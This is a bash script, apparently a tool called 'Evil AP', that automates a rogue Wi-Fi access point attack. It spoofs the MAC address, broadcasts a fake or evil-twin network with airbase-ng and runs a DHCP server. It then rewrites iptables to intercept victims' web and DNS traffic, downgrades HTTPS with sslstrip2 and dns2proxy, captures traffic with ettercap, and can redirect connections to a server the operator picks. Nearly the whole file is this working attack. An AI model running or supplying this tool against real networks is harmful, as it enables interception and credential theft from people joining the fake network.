#!/bin/bash
x="0"					# x offset value
y="0"					# y offset value
width="100"				# width value
height="7"				# height value
yoffset="120"				# y offset
unset yn

##################################################
f_displayHeader(){
	echo "  ▓█████ ██▒   █▓ ██▓ ██▓        ▄▄▄       ██▓███      ██▒   █▓    ██▓      ▒█████   "
	echo "  ▓█   ▀▓██░   █▒▓██▒▓██▒       ▒████▄    ▓██░  ██▒   ▓██░   █▒   ███▒     ▒██▒  ██▒ "
	echo "  ▒███   ▓██  █▒░▒██▒▒██░       ▒██  ▀█▄  ▓██░ ██▓▒    ▓██  █▒░   ▒██▒     ▒██░  ██▒ "
	echo "  ▒▓█  ▄  ▒██ █░░░██░▒██░       ░██▄▄▄▄██ ▒██▄█▓▒ ▒     ▒██ █░░   ░██░     ▒██   ██░ "
	echo "  ░▒████▒  ▒▀█░  ░██░░██████▒    ▓█   ▓██▒▒██▒ ░  ░      ▒▀█░     ████ ██▓ ░ ████▓▒░ "
	echo "  ░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░    ▒▒   ▓▒█░▒▓▒░ ░  ░      ░ ▐░     ░▒ ░ ▒▓▒ ░ ▒░▒░▒░  "
	echo "   ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░     ▒   ▒▒ ░░▒ ░           ░ ░░     ░▒ ░ ░▒    ░ ▒ ▒░  "
	echo "     ░       ░░   ▒ ░  ░ ░        ░   ▒   ░░               ░░    ░ ▒ ░ ░   ░ ░ ░ ▒   "
	echo "     ░  ░     ░   ░      ░  ░         ░  ░                  ░      ░    ░      ░ ░   "
	echo "             ░                                             ░            ░            "
	echo ""
	echo ""
}
##################################################

##################################################
f_displayMenu(){
	clear
	f_displayHeader
	echo "1) Redirect traffic on your server"
	echo "2) Cancel redirecting traffic"
	echo "q) Quit properly"
	unset menu
	while [ -z $menu ]; do
		read menu
	done
	
	if [ $menu = "q" ]; then
		kill $(pidof ettercap)
		kill $(pidof python)
		kill $(pidof airbase-ng)
		kill $(pidof tail)
		echo -e "\e[1;34m[*]\e[0m Cleaning iptables..."
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
	
		echo -e "\e[1;34m[*]\e[0m Stopping IP Forwarding..."
		echo "0" > /proc/sys/net/ipv4/ip_forward

		echo -e "\e[1;34m[*]\e[0m Stopping DHCP Server..."
		service isc-dhcp-server stop
		airmon-ng stop "{MONMODE}"
		
		#can solve problems
		if [ -e /var/run/dhcpd.pid ]; then
			rm /var/run/dhcpd.pid
		fi
		
	elif [ $menu = "1" ]; then
		echo "\e[1;34m[*]\e[0m Cleaning iptables, make sure your server is enabled..."

		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain

		unset addServer
		while [ -z $addServer ]; do
			read -p  "Enter the address of your serveur, [ default = 192.168.0.1 ]: " addServer
			if [ -z $addServer ]; then
				addServer="192.168.0.1"
			fi
		done

		iptables --table nat --append POSTROUTING --out-interface "${IFACE}" -j MASQUERADE
		iptables --append FORWARD --in-interface "${TUNIFACE}" -j ACCEPT
		echo 1 > /proc/sys/net/ipv4/ip_forward
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "$addServer":80
		iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination "$addServer":80
		iptables -t nat -A POSTROUTING -j MASQUERADE
		sleep 2
		f_displayMenu

	elif [ $menu = "2" ];then

		echo "\e[1;34m[*]\e[0m Cleaning iptables, sniffing traffic..."
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
		iptables -P FORWARD ACCEPT
		iptables -t nat -A POSTROUTING -o ${IFACE} -j MASQUERADE
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
		sleep 2
		f_displayMenu
	fi
}
##################################################

##################################################
f_dhcpdconf(){
	echo "ddns-update-style none;" > $DHCPPATH
	echo "authoritative;" >> $DHCPPATH
	echo "log-facility local7;" >> $DHCPPATH
	echo "subnet 192.168.0.0 netmask 255.255.255.0 {" >> $DHCPPATH
	echo "range 192.168.0.100 192.168.0.200;" >> $DHCPPATH
	echo "option domain-name-servers 8.8.8.8;" >> $DHCPPATH
	echo "option routers 192.168.0.1;" >> $DHCPPATH
	echo "option broadcast-address 192.168.0.255;" >> $DHCPPATH
	echo "default-lease-time 600;" >> $DHCPPATH
	echo "max-lease-time 7200;" >> $DHCPPATH
	echo "}" >> $DHCPPATH
}
##################################################

##################################################
f_changeMac(){
	ifconfig "${MONMODE}" down
	unset rom
	read -p "Press r for randomly or m for manually: " rom
	if [ $rom = "r" ]; then
		macchanger -r "${MONMODE}"
	else
		unset mac
		read -p "Enter mac adress: " mac
		macchanger --mac=$mac "${MONMODE}"
	fi
	ifconfig "${MONMODE}" up
	
}
##################################################
#create logs directory
logfldr=$PWD/fakeAP-logs-$(date +%F-%H%M)
mkdir -p $logfldr
f_displayHeader
unset IFACE
while [ -z "${IFACE}" ]; do read -p "Interface connected to the internet (ex. eth0): " IFACE; done

unset WIFACE
while [ -z "${WIFACE}" ]; do read -p "Wireless interface name (ex. wlan0): " WIFACE; done

unset ESSID
while [ -z "${ESSID}" ]; do read -p "ESSID you would like your rogue AP to be called, example FreeWiFi: " ESSID; done

#set evil twin attack
evil=0
read -p "Would you use evil twin attack? [y/N]: " yn
if [ $yn = "y" ]; then
	evil=1
fi
#start monitor mode
if [ $evil = 1 ]; then
	airmon-ng start $WIFACE &> /dev/null
else
	unset CHAN
	while [ -z "${CHAN}" ]; do read -p "Channel you would like to broadcast on: " CHAN; done
	airmon-ng start ${WIFACE} ${CHAN} &> /dev/null
fi


echo -e "\n\e[1;34m[*]\e[0m Your interface is in Monitor Mode\n"
airmon-ng | grep mon | sed '$a\\n'
unset MONMODE
while [ -z "${MONMODE}" ]; do read -p "Enter your monitor enabled interface name, (ex: wlan1mon0): " MONMODE; done
read -p "Would you like to change your mac adress? [y/N]: " yn
if [ $yn = "y" ]; then
	f_changeMac
fi

unset TUNIFACE
while [ -z "${TUNIFACE}" ]; do read -p "Enter your tunnel interface, (ex: at0): " TUNIFACE; done

#launch airbase
echo -e "\e[1;34m[*]\e[0m Launching Airbase..."
if [ $evil = 1 ]; then
	xterm -geometry  "$width"x$height-$x+$y -bg green -fg white -T "Airbase-NG" -e airbase-ng -P -C 60 -e "${ESSID}" ${MONMODE} &
else
	xterm -geometry  "$width"x$height-$x+$y -bg green -fg white -T "Airbase-NG" -e airbase-ng -e "${ESSID}" -c "${CHAN}" ${MONMODE} &
fi

#configure tunneled interface
sleep 2
echo -e "\e[1;34m[*]\e[0m Configuring tunneled interface."
ATIP="192.168.0.1"
ATNET="192.168.0.0"
ATSUB="255.255.255.0"
ifconfig "${TUNIFACE}" up
ifconfig "${TUNIFACE}" "${ATIP}" netmask "${ATSUB}"
ifconfig "${TUNIFACE}" mtu 1500
route add -net "${ATNET}" netmask "${ATSUB}" gw "${ATIP}" dev "${TUNIFACE}"
sleep 2

#set iptables
echo -e "\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o ${IFACE} -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
sleep 2
echo -e "\e[1;34m[*]\e[0m Configuring IP forwarding..."
echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 1

echo -e "\e[1;34m[*]\e[0m Launching Tail."
y=$(($y+$yoffset))
xterm -geometry  "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &

#set up dhcp server
read -p "Do you want to write your dhcpd.conf? [y/N]: " yn
if [ -z $yn ] || [ $yn = "y" ] || [ $yn = "Y" ]; then
	unset DHCPPATH
	read -p "Enter the path of dhcpd.conf [default = /etc/dhcp/dhcpd.conf]: " DHCPPATH
	if [ -z $DHCPPATH ]; then
		DHCPPATH=/etc/dhcp/dhcpd.conf
	fi
	f_dhcpdconf
fi
sleep 1
service isc-dhcp-server start
sleep 2

unset pathSslstrip
read -p "Enter the path of sslstrip [default = ~]: " pathSslstrip
if [ -z $pathSslstrip]; then
	pathSslstrip=~
fi

unset pathDns
read -p "Enter the path of dns2proxy [default = ~]: " pathDns
if [ -z $pathDns]; then
	pathDns=~
fi

echo -e "\e[1;34m[*]\e[0m Launching SSLStrip..."
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "SSLStrip" -e python $pathSslstrip/sslstrip2/sslstrip.py -af -w $logfldr/sslstrip$(date +%F-%H%M)&
sleep 5

echo -e "\e[1;34m[*]\e[0m Launching Tail for Sslstrip2."
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg white -fg black -T "Sslstrip Logs" -e tail -f $logfldr/sslstrip* &

echo -e "\e[1;34m[*]\e[0m Launching dns2proxy..."
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "dns2proxy" -e python2.7 $pathDns/dns2proxy/dns2proxy.py -i "${TUNIFACE}"&


echo -e "\e[1;34m[*]\e[0m Launching Ettercap."
xterm -geometry "120"x200-700+0 -T "Ettercap" -bg black -fg blue -e ettercap -Tqi "${TUNIFACE}" -L $logfldr/ettercap$(date +%F-%H%M)&

f_displayMenu


